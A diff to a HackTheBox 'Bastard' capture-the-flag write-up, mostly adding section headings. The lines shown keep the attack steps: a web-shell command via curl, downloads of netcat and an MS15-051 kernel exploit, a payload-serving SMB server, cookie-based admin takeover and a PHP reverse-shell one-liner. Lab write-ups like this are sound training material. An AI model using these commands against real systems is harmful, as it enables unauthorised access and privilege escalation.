@@ -126,8 +126,9 @@ root@kali:~/htb/bastard/droopescan# ./droopescan scan drupal -u 10.10.10.9
 [+] Scan finished (0:46:17.029916 elapsed)
 ```
 
-From above the default file in Drupal is CHANGELOG.txt, having a look we see: Drupal 7.54, 2017-02-01
-Google that for exploit and [find this.](https://www.ambionics.io/blog/drupal-services-module-rce) Looks complicated, so see if there is anything in Exploit-DB:
+## Gaining Access
+
+From above, the default file in Drupal is CHANGELOG.txt, having a look we see: Drupal 7.54, 2017-02-01. I Google that for exploit and [find this.](https://www.ambionics.io/blog/drupal-services-module-rce) Looks complicated, so see if there is anything in Exploit-DB:
 
 ```text
 root@kali:~/htb/bastard# searchsploit drupal
@@ -201,13 +202,15 @@ root@kali:~/htb/bastard# curl http://10.10.10.9/test.php?cmd=whoami
 nt authority\iusr
 ```
 
-So have iusr accessible via exploit, now connect it to a reverse shell with 64bit netcat for Windows:
+## Initial Shell
+
+So I have iusr accessible via exploit, now connect it to a reverse shell with 64bit netcat for Windows:
 
 ```text
 root@kali:~/htb/bastard# wget https://github.com/phackt/pentest/raw/master/privesc/windows/nc64.exe
 ```
 
-Start smbserver so can pull file from box:
+Start smbserver so I can pull file from box:
 
 ```text
 root@kali:~/htb/bastard# python /opt/impacket/examples/smbserver.py share /root/htb/bastard/
@@ -236,7 +239,13 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\inetpub\drupal-7.54>whoami
 nt authority\iusr
+```
 
+## User Flag
+
+Let's grab the user flag before we move on:
+
+```text
 C:\inetpub\drupal-7.54>type c:\users\dimitris\desktop\user.txt
 type c:\users\dimitris\desktop\user.txt
 <<HIDDEN>>
@@ -289,7 +298,9 @@ Network Card(s):           1 NIC(s) Installed.
                                  [01]: 10.10.10.9
 ```
 
-So base install of Server 2008R2, which means it's vulnerable to [MS015-51](https://www.exploit-db.com/exploits/37049), grab a version from GitHub:
+## Privilege Escalation
+
+We have a base install of Server 2008R2, which means it's vulnerable to [MS015-51](https://www.exploit-db.com/exploits/37049), grab a version from GitHub:
 
 ```text
 root@kali:~/htb/bastard# wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip
@@ -313,7 +324,13 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\inetpub\drupal-7.54>whoami
 whoami
 nt authority\system
+```
 
+## Root Flag
+
+Excellent, we are now connected as system user so we can grab the root flag:
+
+```text
 C:\inetpub\drupal-7.54>dir c:\users\administrator\desktop
 dir c:\users\administrator\desktop
  Volume in drive C has no label.
@@ -330,7 +347,7 @@ type c:\users\administrator\desktop\root.txt.txt
 <<HIDDEN>>
 ```
 
-## Alternative IPPSEC version
+## Alternative IPPSEC Method
 
 Start by editing 41564.php so it looks like this:
 
@@ -431,7 +448,7 @@ Use the session name and id to create a cookie in Firefox:
 
 ![bastard_cookie](/assets/images/2020-07-03-16-10-35.png)
 
-Now browse to http://10.10.10.9 and will have an admin session established using the cookie we've created, so no need to login:
+Now browse to <http://10.10.10.9> and will have an admin session established using the cookie we've created, so no need to login:
 
 ![bastard_admin](/assets/images/2020-07-03-16-10-57.png)
 
@@ -452,3 +469,5 @@ I could now use this method to initiate a reverse shell, by pasting the php code
 ```text
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
+
+All done. See you next time.
